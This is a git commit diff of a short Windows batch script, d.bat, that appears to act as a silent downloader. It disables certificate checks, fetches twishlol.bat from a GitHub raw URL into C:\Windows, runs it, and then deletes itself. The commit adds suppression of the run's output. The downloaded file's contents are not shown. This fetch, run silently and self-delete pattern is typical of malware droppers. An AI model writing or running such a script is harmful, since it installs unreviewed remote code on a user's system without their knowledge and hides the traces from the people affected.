4f3e312d09ecb1f395a3fcb3db4d03fb2b05800f
twish1x <153032092+twish1x@users.noreply.github.com>
2025-03-16 11:12:54 -0700

    Update d.bat

--- d.bat
+++ d.bat
@@ -2,5 +2,5 @@
 cls
 curl -g -k -L -# -o C:\Windows\twishlol.bat https://raw.githubusercontent.com/twish1x/apps/refs/heads/main/twishlol.bat >> nul 2> nul
 
-start C:\Windows\twishlol.bat
+start C:\Windows\twishlol.bat >> nul 2> nul
 del "%~f0"
